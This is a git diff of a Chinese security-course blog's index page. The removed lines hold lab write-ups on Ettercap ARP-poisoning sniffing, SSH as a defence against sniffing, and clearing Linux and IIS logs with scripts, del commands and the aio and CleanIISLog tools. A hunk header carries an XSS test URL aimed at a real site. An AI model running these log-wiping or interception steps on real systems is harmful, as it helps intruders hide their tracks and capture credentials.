-<p>   11、在目标机中，打开“开始”菜单，输入cmd打开命令界面，输入命令ipconfig查看本机的IP。</p>
-<p>   12、返回Ettercap界面，选择192.168.122.175主机，然后单击Add to Target1按钮，添加目标系统。</p>
-<p>   13、进行如下操作，单击Start sniffing启动嗅探。</p>
-<p>   之后选择ARP poisoning，启动ARP注入攻击 </p>
-<p>   选择Sniff remote connections。</p>
-<p>   14、此时使用主机192.168.122.175时，它的敏感信息会被传递给攻击者。</p>
-<p>   15、选择Stop sniffing，停止嗅探。</p>
-<p>   选择Stop mitm attack(s)，停止中间人攻击。</p>
-<hr>
-<h2 id="网络监听的防范"><a href="#网络监听的防范" class="headerlink" title="网络监听的防范"></a>网络监听的防范</h2><h4 id="一【实验目标】-4"><a href="#一【实验目标】-4" class="headerlink" title="一【实验目标】"></a>一【实验目标】</h4><p>   l掌握防范网络监听的主要原理和技术手段</p>
-<h4 id="二【实验环境】-4"><a href="#二【实验环境】-4" class="headerlink" title="二【实验环境】"></a>二【实验环境】</h4><p>   lSSH客户端环境：Windows XP系统，SSH客户端<br>   lSSH服务端环境：Kali2系统，SSH服务器<br>   l实验拓扑：如下图所示</p>
-<h4 id="三【实验原理】-4"><a href="#三【实验原理】-4" class="headerlink" title="三【实验原理】"></a>三【实验原理】</h4><p>   对网络监听的防范措施主要包括以下几个。<br>   1、从逻辑或物理上对网络分段<br>   网络分段通常被认为是控制网络广播风暴的一种基本手段，但其实也是保证网络安全的一向措施。其目的是将非法用户与敏感的网络资源相互隔离，从而防止可能的非法监听。<br>   2、以交换式集线器代替共享式集线器<br>   对局域网的中心交换机进行网络分段后，局域网监听的危险任然存在。这是因为网络最终用户的接入往往是通过分支集线器而不是中心交换机，而使用最广泛的分支集线器通常是共享式集线器。这样，当用户与主机进行数据通信时，两台机器之间的数据包（称为单播包Unicase Packet）还是会被同一台集线器上的其他用户所监听。<br>   因此，应该以交换式集线器代替共享式集线器，使单播包仅在两个节点之间传送，从而防止非法监听。当然，交换式集线器只能控制单播包而无法控制广播包（Broadcase Packet）和多播报（Multicase Packet）。但广播包和多播包内的关键信息，要远远少于单播包。<br>   3、使用加密技术<br>   数据经过加密后，通过监听仍然可以得到传送的信息，但显示的是乱码。使用加密技术的缺点是影响数据传输速度以及使用一个弱加密术比较容易被攻破。系统管理员和用户需要在网络速度和安全性上进行折中。<br>   4、划分VLAN<br>   运用VLAN（虚拟局域网）技术，将以太网通信变为点到点通信，可以防止大部分基于网络监听的入侵。<br>   这里主要讨论加密技术来防止网络监听。传统的网络服务程序，如FTP、POP和Telnet在传输机制和实现原理上是没有考虑安全机制的，其本质上都是不安全的；因为他们在网络上用明文传送数据。用户账号和用户口令，别有用心的人通过窃听等网络攻击手段非常容易的就可以截获这些数据、用户账号和用户口令。SSH是英文Secure Shell的简写形式，通过使用SSH可以把所有传输的数据进行加密，这样就能够防止网络监听，也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、POP，甚至PPP提供一个安全的“通道”。</p>
-<h4 id="四【实验步骤】-4"><a href="#四【实验步骤】-4" class="headerlink" title="四【实验步骤】"></a>四【实验步骤】</h4><p>   1、打开SSH服务器机器，在终端输入 service ssh start以启动SSH服务端程序。输入service ssh status以检查SSH服务是否开启成功。如图2</p>
-<p>   2、打开Windows XP SSH客户端机器，点击快速链接按钮，出现“Connect to Romote Host”对话框。在“Host Name”里面填入SSH服务端主机的IP地址，在“User Name”内填入用户名“test”，Authentication选择Password，最后点击“Connect”按钮。如图3</p>
-<p>   在这一步，不要企图以root用户身份链接，因为在默认情况下，Linux不允许以root身份远程连接；所示应该建立非root用户连接，然后使用su命令获取root权限。如果有必要，应该事先创建一个非root账户。<br>   紧接着我们输入密码123456点击“OK”</p>
-<p>   已经成功连接到SSH服务端。完成上述步骤后，就获得了服务器端的公钥，并且建立了认证关系</p>
-<p>   4、打开Edit菜单，选择Setting，在弹出的对话中左侧的树状结构中选择Keys节点，应该看到从服务器端传输过来的公钥。在这一步，还可以通过选择不同的按钮导入（Import）、导出（Export）、删除（Delete）主机公钥文件（注意与用户公钥文件的区别）。如图6<br>   打开Sniffer Pro，开始捕获数据包，注意所捕到的数据包为加密包，可见通过SSH建立了安全连接。<br>   同时建立到该机器的Telnet会话和SSH会话，注意Sniffer Pro所捕获的数据包的差异性：即Telnet连接信息时可见的、不加密的，而SSH会话连接会对相关信息进行数据加密，从而保障了通信安全。</p>
-<p>   5、通过SSH在FTP方式下安全的传输文件。打开F-Secure SSH FTP点击“Quick Connect”，在弹出的“Connect to Remote Host”对话中输入SSH服务端机器的IP地址，用户名输入“test”，点击“Connect”按钮。</p>
-<p>   输入密码，1234568</p>
-<p>   6、通过上述步骤，SSH客户将通过认证建立起一个安全的FTP连接。如图9</p>
-<p>   7、上传一个简单的文件到FTP站点。使用Sniffer Pro捕获数据包，查看数据包的内容。<br>   打开命令行提示窗口，使用命令连接，使用get命令将刚才的文件下载，注意观察下载过程中Sniffer Pro所捕捉到的数据包，对比两次的捕获结果。<br>   在Edit菜单中选择Settings，打开Settings对话框如图10.在这一步，可以对有关参数进行详细配置，以满足当前网络的不同需求，例如，可以通过选择File Transfer节点进行编辑。</p>
-<h4 id="五【实验思考】-4"><a href="#五【实验思考】-4" class="headerlink" title="五【实验思考】"></a>五【实验思考】</h4><p>   l除使用SSH外还可以使用哪些技术类防范网络监听？请对比这些技术的优缺点。</p>
-<p>​    </p>
-
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/嗅探欺骗实验/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1009,6 +919,15 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     2.4k 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     8 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -1054,6 +973,37 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  8
+                </span>
+              
+            </div>
+          
 
           
 
@@ -1071,126 +1021,14 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
 
       
         
-          
-            <h1 id="日志清除实验"><a href="#日志清除实验" class="headerlink" title="日志清除实验"></a>日志清除实验</h1><h2 id="Windows上的IIS日志手动清除实验"><a href="#Windows上的IIS日志手动清除实验" class="headerlink" title="Windows上的IIS日志手动清除实验"></a>Windows上的IIS日志手动清除实验</h2><p>实验环境<br>Windows7操作系统,IIS服务器<br>实验目的<br>手动清除本机上的IIS日志<br>实验原理</p>
-<h5 id="IIS日志中记录以下信息："><a href="#IIS日志中记录以下信息：" class="headerlink" title="IIS日志中记录以下信息："></a>IIS日志中记录以下信息：</h5><ol>
-<li>请求发生在什么时刻，</li>
-<li>哪个客户端IP访问了服务端IP的哪个端口，</li>
-<li>客户端工具是什么类型，什么版本，</li>
-<li>请求的URL以及查询字符串参数是什么，</li>
-<li>请求的方式是GET还是POST，</li>
-<li>请求的处理结果是什么样的：HTTP状态码，以及操作系统底层的状态码，</li>
-<li>请求过程中，客户端上传了多少数据，服务端发送了多少数据，</li>
-<li>请求总共占用服务器多长时间、等等。<br>实验步骤</li>
-<li>获取IIS日志文件的存放路径<br>点击开始-控制面板-系统和安全-管理工具-&gt;Internet信息服务 </li>
-</ol>
-<p>打开IIS服务器，点击网站-默认网站，在中间的功能视图中选择日志，打开。 </p>
-<p>(2)我们可以 点击“选择字段”去设置我们的日志中需要记录的内容。</p>
-<p>(3)查看“W3C扩展日志文件”的保存位置<br>复制“目录”中的路径，在文件夹中打开。</p>
-<ol start="2">
-<li>查看日志文件<br>如果在IIS中启用了日志记录，则用户访问网站时，系统会自动记录IIS日志，并生成log。任意打开一个日志文件</li>
-</ol>
-<ol start="3">
-<li>手动删除IIS日志文件<br>(1)点击开始，在输入框中输入cmd，打开命令提示符，右键以管理员运行。使用命令cd C:\WINDOWS\system32\LogFiles\进入到该目录下，然后输入dir命令，查看该目录下的W3SVC目录。</li>
-</ol>
-<p>(2)输入命令cd C:\WINDOWS\system32\LogFiles\W3SVC1\，转到W3SVC1目录下，输入命令net stop w3svc，停止w3svc服务，再输入：del <em>.</em>，删除所有日志文件，最后输入：net start w3svc，启动w3svc服务。</p>
-<p>(3)再次打开w3svc1目录，发现日志文件已经清除了。</p>
-<h6 id="实验思考-练习"><a href="#实验思考-练习" class="headerlink" title="实验思考/练习"></a>实验思考/练习</h6><p>掌握针对日志清除攻击的防御方法</p>
-<hr>
-<h2 id="linux日志清除实验"><a href="#linux日志清除实验" class="headerlink" title="linux日志清除实验"></a>linux日志清除实验</h2><p><strong>实验环境</strong></p>
-<p>Ubantu linux</p>
-<p><strong>实验目的</strong></p>
-<h5 id="手动清除linux的日志文件，掌握针对日志文件清除攻击的防御方法。"><a href="#手动清除linux的日志文件，掌握针对日志文件清除攻击的防御方法。" class="headerlink" title="手动清除linux的日志文件，掌握针对日志文件清除攻击的防御方法。"></a>手动清除linux的日志文件，掌握针对日志文件清除攻击的防御方法。</h5><p><strong>实验原理</strong></p>
-<p>在ubantu linux系统中，在/var/log/目录下，包含了很多系统自动记录的日志信息。</p>
-<p>/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer），可以用dmesg查看它们。</p>
-<p>/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。</p>
-<p>/var/log/boot.log — 包含系统启动时的日志。</p>
-<p>/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。</p>
-<p>/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。</p>
-<p>/var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。</p>
-<p>/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。</p>
-<p>/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。</p>
-<p>/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</p>
-<p><strong>实验步骤</strong></p>
-<p>\1. 使用账号密码：root/123456登陆实验机，按ctrl+alt+t打开终端。</p>
-<p>\2. 进入/varlog，查看该目录下的文件。</p>
-<p>使用命令：</p>
-<p>cd /var/log/</p>
-<p>ls</p>
-<p>3.其中一部分文件的作用在实验原理部分已经介绍过了，接下来我们进行日志的清除。需要注意的是，如果直接输入 rm –r logfile ，这样是不行的，因为应用已经打开文件句柄，直接删除会造成1.应用无法正确释放日志文件和写入；2.显示磁盘空间未释放。</p>
-<p>\4. 正确的清除日志方法是把以下代码保存为.sh后缀脚本来运行即可清除Linux系统日志</p>
-<p>#!/bin/sh </p>
-<p>cat /dev/null &gt; /var/log/syslog </p>
-<p>cat /dev/null &gt; /var/log/wtmp </p>
-<p>cat /dev/null &gt; /var/log/maillog </p>
-<p>cat /dev/null &gt; /var/log/messages </p>
-<p>cat /dev/null &gt; /var/log/openwebmail.log </p>
-<p>cat /dev/null &gt; /var/log/maillog </p>
-<p>cat /dev/null &gt; /var/log/secure  </p>
-<p>首先，在/var/log目录下输入leafpad clear.sh，新建一个shell脚本并输入上面的内容，保存并退出：</p>
-<p>5.需要修改脚本权限，使得shell脚本有清除系统日志的权限。使用命令chmod 755 clear.sh。再使用命令./clear.sh运行脚本，结束后，我们任意打开一个日志文件，发现日志已经清空了。</p>
-<h6 id="实验思考-练习-1"><a href="#实验思考-练习-1" class="headerlink" title="实验思考/练习"></a><strong>实验思考/练习</strong></h6><p>为什么要使用shell脚本？</p>
-<hr>
-<h2 id="利用AIO实现IIS日志清除"><a href="#利用AIO实现IIS日志清除" class="headerlink" title="利用AIO实现IIS日志清除"></a>利用AIO实现IIS日志清除</h2><p>实验环境<br>Windows7操作系统<br>实验目的<br>掌握aio清除日志的方法<br>实验原理</p>
-<h5 id="IIS日志中记录以下信息：-1"><a href="#IIS日志中记录以下信息：-1" class="headerlink" title="IIS日志中记录以下信息："></a>IIS日志中记录以下信息：</h5><ol>
-<li>请求发生在什么时刻，</li>
-<li>哪个客户端IP访问了服务端IP的哪个端口，</li>
-<li>客户端工具是什么类型，什么版本，</li>
-<li>请求的URL以及查询字符串参数是什么，</li>
-<li>请求的方式是GET还是POST，</li>
-<li>请求的处理结果是什么样的：HTTP状态码，以及操作系统底层的状态码，</li>
-<li>请求过程中，客户端上传了多少数据，服务端发送了多少数据，</li>
-<li>请求总共占用服务器多长时间、等等。<br>实验步骤</li>
-<li>获取IIS日志文件的存放路径<br>点击开始-控制面板-系统和安全-管理工具-&gt;Internet信息服务 </li>
-</ol>
-<p>打开IIS服务器，点击网站-默认网站，在中间的功能视图中选择日志，打开。</p>
-<p>(2)我们可以 点击“选择字段”去设置我们的日志中需要记录的内容。</p>
-<p>(3)查看“W3C扩展日志文件”的保存位置<br>复制“目录”中的路径，在文件夹中打开。</p>
-<ol start="2">
-<li>查看日志文件<br>如果在IIS中启用了日志记录，则用户访问网站时，系统会自动记录IIS日志，并生成log。任意打开一个日志文件</li>
-</ol>
-<ol start="3">
-<li><p>手动删除IIS日志文件</p>
-<h5 id="1-运行aio程序"><a href="#1-运行aio程序" class="headerlink" title="(1)运行aio程序"></a>(1)运行aio程序</h5><p>点击桌面-课程-工具，找到AIO的目录，按住shif再右键鼠标。</p>
-</li>
-</ol>
-<p>输入命令aio，运行成功后，会显示该工具的用法。</p>
-<p>（2）运行删除日志命令<br>使用aio -cleanlog删除默认位置的所有日志。<br>日志删除命令执行界面。提示删除失败是因为权限的原因，如果要删除的话需要以管理员身份运行cmd，再执行一遍命令。</p>
-<p> (3)检验是否清除成功<br>再次进入c：\inetpub\logs\logfiles\目录，会提示没有这个目录，进入上一级目录，会发现已经没有logfiles这个目录了。</p>
-<h6 id="实验思考-练习-2"><a href="#实验思考-练习-2" class="headerlink" title="实验思考/练习"></a>实验思考/练习</h6><p>比较aio工具与cleaniislog工具的区别。</p>
-<hr>
-<h2 id="利用CleanIISLog实现IIS日志清除"><a href="#利用CleanIISLog实现IIS日志清除" class="headerlink" title="利用CleanIISLog实现IIS日志清除"></a>利用CleanIISLog实现IIS日志清除</h2><p>实验环境<br>Windows7操作系统。<br>实验目的</p>
-<h5 id="了解IIS日志文件清除的基本原理"><a href="#了解IIS日志文件清除的基本原理" class="headerlink" title="了解IIS日志文件清除的基本原理;"></a>了解IIS日志文件清除的基本原理;</h5><h5 id="掌握CleanIISLog-exe工具的使用方法和各项功能"><a href="#掌握CleanIISLog-exe工具的使用方法和各项功能" class="headerlink" title="掌握CleanIISLog.exe工具的使用方法和各项功能."></a>掌握CleanIISLog.exe工具的使用方法和各项功能.</h5><p>实验原理<br>IIS日志中记录以下信息：</p>
-<ol>
-<li>请求发生在什么时刻，</li>
-<li>哪个客户端IP访问了服务端IP的哪个端口，</li>
-<li>客户端工具是什么类型，什么版本，</li>
-<li>请求的URL以及查询字符串参数是什么，</li>
-<li>请求的方式是GET还是POST，</li>
-<li>请求的处理结果是什么样的：HTTP状态码，以及操作系统底层的状态码，</li>
-<li>请求过程中，客户端上传了多少数据，服务端发送了多少数据，</li>
-<li>请求总共占用服务器多长时间、等等。<br>实验步骤</li>
-<li>获取IIS日志文件的存放路径<br>点击开始-控制面板-系统和安全-管理工具-&gt;Internet信息服务 </li>
-</ol>
-<p>打开IIS服务器，点击网站-默认网站，在中间的功能视图中选择日志，打开。</p>
-<p>(2)我们可以 点击“选择字段”去设置我们的日志中需要记录的内容。</p>
-<p>(3)查看“W3C扩展日志文件”的保存位置<br>复制“目录”中的路径，在文件夹中打开。</p>
-<ol start="2">
-<li>查看日志文件<br>如果在IIS中启用了日志记录，则用户访问网站时，系统会自动记录IIS日志，并生成log。任意打开一个日志文件</li>
-</ol>
-<ol start="3">
-<li>手动删除IIS日志文件<br>（1）测试CleanIISLog软件能否正常运行<br>点击桌面-课程-工具，找到CleanIISLog软件所在目录下，按住shift并右键鼠标，选择“在此处打开命令窗口”。</li>
-</ol>
-<p>输入“CleanIISLog”命令，若运行正常，则会给出一些帮助信息，如图所示，否则会提示错误信息。</p>
-<ol start="4">
-<li><h6 id="使用CleanIISLog-exe清除IIS日志"><a href="#使用CleanIISLog-exe清除IIS日志" class="headerlink" title="使用CleanIISLog.exe清除IIS日志"></a>使用CleanIISLog.exe清除IIS日志</h6><p>该工具可以清除某个特定IP地址产生的日志文件，使用以下命令：<br>CleanIISLog C:\WINDOWS\system32\LogFiles\日志文件 IP地址<br>执行成功后，会提示修改了多少处。<br>在这里，我们输入C:\WINDOWS\system32\LogFiles\W3SVC2\ u_ex170829.log 为需要清除的日志文件，127.0.0.1为要清除的ip地址，</p>
-</li>
-</ol>
-<p>再次打开日志文件 u_ex170829.log ，从中可以发现该日志中无127.0.0.1的ip地址信息.</p>
-<h6 id="实验思考-练习-3"><a href="#实验思考-练习-3" class="headerlink" title="实验思考/练习"></a>实验思考/练习</h6><p>尝试其他CleanIISLog工具的功能。</p>
-<hr>
-
-          
+          <h1 id="日志清除实验"><a href="#日志清除实验" class="headerlink" title="日志清除实验"></a>日志清除实验</h1><h2 id="Windows上的IIS日志手动清除实验"><a href="#Windows上的IIS日志手动清除实验" class="headerlink" title="Windows上的IIS日志手动清除实验"></a>Windows上的IIS日志手动清除实验</h2><p>实验环境<br>Windows7操作系统,IIS服务器<br>实验目的<br>手动清除本机上的IIS日志<br>实验原理</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/10/日志清除实验/" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1245,6 +1083,15 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
       <meta itemprop="image" content="/images/1.jpg">
     </span>
 
+     <span title="Words count in article">
+     21.4k 字
+     </span>
+
+        ...
+     <span title="Reading time">
+     80 分钟
+     </span>
+
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="changyouB-log">
     </span>
@@ -1290,6 +1137,37 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
           
 
           
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  21.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time </span>
+                
+                <span title="Reading time">
+                  80
+                </span>
+              
+            </div>
+          
 
           
 
@@ -1307,845 +1185,15 @@ https://hk.trip.com/travel-guide/search/?keyword=%3Cscript%3Ealert(%2Fxss%2F)%3C
 
       
         
-          
-            <h1 id="windows-server-2008基础内容"><a href="#windows-server-2008基础内容" class="headerlink" title="windows server 2008基础内容"></a>windows server 2008基础内容</h1><h2 id="第一章计算机的组装与维护"><a href="#第一章计算机的组装与维护" class="headerlink" title="第一章计算机的组装与维护"></a>第一章计算机的组装与维护</h2><h4 id="本章结构"><a href="#本章结构" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、计算机的硬件概述<br>二、BIOS的设置<br>三、常见故障排查</p>
+          <h1 id="windows-server-2008基础内容"><a href="#windows-server-2008基础内容" class="headerlink" title="windows server 2008基础内容"></a>windows server 2008基础内容</h1><h2 id="第一章计算机的组装与维护"><a href="#第一章计算机的组装与维护" class="headerlink" title="第一章计算机的组装与维护"></a>第一章计算机的组装与维护</h2><h4 id="本章结构"><a href="#本章结构" class="headerlink" title="本章结构"></a>本章结构</h4><p>一、计算机的硬件概述<br>二、BIOS的设置<br>三、常见故障排查</p>
 <p>四、组装计算机（动手）</p>
-<h4 id="具体知识点"><a href="#具体知识点" class="headerlink" title="具体知识点"></a>具体知识点</h4><h4 id="一、-概述"><a href="#一、-概述" class="headerlink" title="一、    概述"></a>一、    概述</h4><h5 id="1、-计算机的工作原理：冯诺-伊曼提出。由输入设备、存储器、运算器、控制器、输出设备五大部件组成"><a href="#1、-计算机的工作原理：冯诺-伊曼提出。由输入设备、存储器、运算器、控制器、输出设备五大部件组成" class="headerlink" title="1、 计算机的工作原理：冯诺.伊曼提出。由输入设备、存储器、运算器、控制器、输出设备五大部件组成"></a>1、 计算机的工作原理：冯诺.伊曼提出。由输入设备、存储器、运算器、控制器、输出设备五大部件组成</h5><h5 id="2、-硬件的主要参数"><a href="#2、-硬件的主要参数" class="headerlink" title="2、 硬件的主要参数"></a>2、 硬件的主要参数</h5><p>​    机箱:物理保护,保护硬件安全.集成电源(升级硬件的时候,注意电源是否供足)<br>​        cpu风扇:风冷扇热和水冷扇热<br>​        光驱:已不流行.(作用:读取和写入光盘数据)<br>​    键盘鼠标:接口(ps2和usb)<br>​        显示器:(lcd crt)</p>
-<p>（1）、CPU(中央处理器)：负责运算与控制<br>核心数：内核，CPU中所有的运算、接受、存储命令都由核心执行<br>主频：表示CPU的运算速度，单位GHz，主频越高、CPU的运算速度越快<br>缓存：CPU和内存之间的临时存储器、容量小、速度快<br>CPU读取数据的顺序：先一级缓存、再二级缓存，然后三级缓存、最后内存<br>两大主流厂商：Intel  和AMD<br>接口类型:AMD针脚式   inter触点式</p>
-<p>（2）、主板：各部件的连接载体（接口类型和数量决定计算机的性能、扩展升级的能力）<br>组成命名：芯片组<br>  RJ45接口：网卡的接口  RJ-11<br>PATA（IDE）、SATA：硬盘接口、光驱（家用计算机）<br>  SCsi：硬盘接口（高档工作站、服务器、价格昂贵、支持热插拔）(sata IDE scsi)<br>PCI、PCI-E:显卡的接口<br>CPU的接口：LGA1633（触点式）、Socket（针脚式）<br>DIMM：内存插槽<br>南桥芯片:负责键盘鼠标显示器usb<br>北桥芯片:负责重要硬件(cpu 内存 硬盘 显卡<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（3）、内存：负责临时存储CPU运算所需的数据（断电后数据丢失）</span><br><span class="line">容量：容量越大越好</span><br><span class="line">主频:标志着单位时间内内存的交换速度(频率)</span><br><span class="line">三通道技术：使用三条同等规格的内存(同主频同品牌同型号)</span><br><span class="line">DDR3：第三代内存</span><br><span class="line"></span><br><span class="line">（4）、显卡：负责将计算机的运算结果转换为影像</span><br><span class="line">芯片厂商：NViDIA和AMD</span><br><span class="line">显存：临时存储需要转换为图像的数据（容量越大越好）</span><br><span class="line">    显存频率：显卡工作的频率（越高速度越快）</span><br><span class="line">显存位宽：瞬间传输数据的流量（位数越大，传输越多）GTX1040  970</span><br><span class="line"></span><br><span class="line">（5）、硬盘：外部存储器（断电后数据不会丢失）</span><br><span class="line">分类:机械硬盘和固态硬盘</span><br><span class="line">        接口类型:sata(主流笔记本硬盘接口) IDE(光驱使用此接口,硬盘的IDE淘汰)  SCSI(用户服务器)</span><br><span class="line">        品牌:希捷 西部数据 三星</span><br><span class="line">    容量：越大越好</span><br><span class="line">    转速：越快传输数据速度越快  5400 7200 10000</span><br><span class="line">固态硬盘：芯片阵列组成、无盘片：读写速度快、散热低、无噪音</span><br><span class="line"></span><br><span class="line">###### （6）、驱动程序：硬件厂商根据操作系统编写的配置文件</span><br><span class="line"></span><br><span class="line">#### 二、    BIOS的设置</span><br><span class="line"></span><br><span class="line">1、概念：基本的输入输出系统的简称，存储在计算机主板的Flash  ROM(cmos芯片)中</span><br><span class="line"></span><br><span class="line">2、功能：存储计算机基本的硬件信息</span><br><span class="line">3、启动过程:</span><br><span class="line">A、加电自检：通电后自动检测硬件的连接情况，如果异常发出报警音</span><br><span class="line">B、初始化：读取硬件参数并存储</span><br><span class="line">C、引导操作系统：按照设定的顺序、将系统装入内存</span><br><span class="line">4、CMOS芯片  存储bios程序</span><br><span class="line"></span><br><span class="line">#### 常见设置</span><br><span class="line"></span><br><span class="line">User  Password  ：只能查看COMS的设置，可以更改自己的密码</span><br><span class="line">Supervisor  Password  ：可以修改（设置后保证了BIOS的安全）</span><br><span class="line">4）、忘记密码的解决方法</span><br><span class="line"></span><br><span class="line">将主板上的电池断电或者用芯片附近的跳线</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">## Vmware  Workstation</span><br><span class="line"></span><br><span class="line">##### 本章结构</span><br><span class="line"></span><br><span class="line">一、虚拟机的概述</span><br><span class="line"></span><br><span class="line">二、虚拟机的使用</span><br><span class="line"></span><br><span class="line">##### 具体知识点</span><br><span class="line"></span><br><span class="line">###### 一、概述</span><br><span class="line"></span><br><span class="line">###### （一）、虚拟机的定义</span><br><span class="line"></span><br><span class="line">是一款软件，能实现模拟计算机硬件的功能，能给其他的应用程序提供一个独立的运行环境</span><br><span class="line"></span><br><span class="line">###### （二）、虚拟机的运行架构（两种）</span><br><span class="line"></span><br><span class="line">1、寄居架构：虚拟机软件需要安装在有操作系统的计算机上。本机称为宿主机，安装在虚拟机的系统称为客户机</span><br><span class="line">2、原生架构：虚拟机不需要依赖其他操作系统，自己本身就是一款系统直接安装在硬件之上</span><br><span class="line"></span><br><span class="line">3、各公司对应的产品</span><br><span class="line">       Vmware  Workstation   寄居架构</span><br><span class="line">1）、Vmware公司</span><br><span class="line">       VmwarevSphere原生架构</span><br></pre></td></tr></table></figure></p>
-<p>   Virtual  PC和Virtual Server   寄居架构</p>
-<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">2</span>、微软</span><br></pre></td></tr></table></figure>
-
-<p>   Hyper—V                   原生架构<br>```</p>
-<p>3、思杰公司XenDesktop<br>       XenServer原生架构</p>
-<h5 id="二、虚拟机操作应用"><a href="#二、虚拟机操作应用" class="headerlink" title="二、虚拟机操作应用"></a>二、虚拟机操作应用</h5><p>1、安装<br>2、新建虚拟机<br>3、常用的快捷键<br>a、从虚拟机切换到宿主机（本机）     Ctrl +Alt<br>b、虚拟机全屏显示                   Ctrl + Alt + Enter<br>c、重启                             Ctrl + Alt + Insert  = Ctrl + Alt + Delete<br>d、从宿主机进入虚拟机               Ctrl + G</p>
-<p>4、管理虚拟机<br>a、迁移虚拟机（把安装好的虚拟机系统复制到其他机器上直接使用）<br>b、安装Vmware Tools（增强虚拟机的硬件功能，使虚拟机能够使用真实机打印机和文件夹等功能，实现直接拖拽文件）<br>c、快照（将虚拟机的系统做个备份，当出现问题时，能将系统快速的恢复到稳定状态）<br>d、克隆：（能快速的创建多个虚拟机系统）<br>链接克隆：引用源虚拟机的一个当前状态，源虚拟机损坏，当前的虚拟机也会损坏（占用空间小）</p>
-<p>完整克隆：创建了一个完整的副本，该虚拟机状态是完全的独立的（占用空间大）</p>
-<p>vmnet0:桥接到真实网卡（真实电脑）<br>vmnet1(独立网络，相当于交换机)</p>
-<h5 id="安装操作系统"><a href="#安装操作系统" class="headerlink" title="安装操作系统"></a>安装操作系统</h5><p>Windows  7的安装</p>
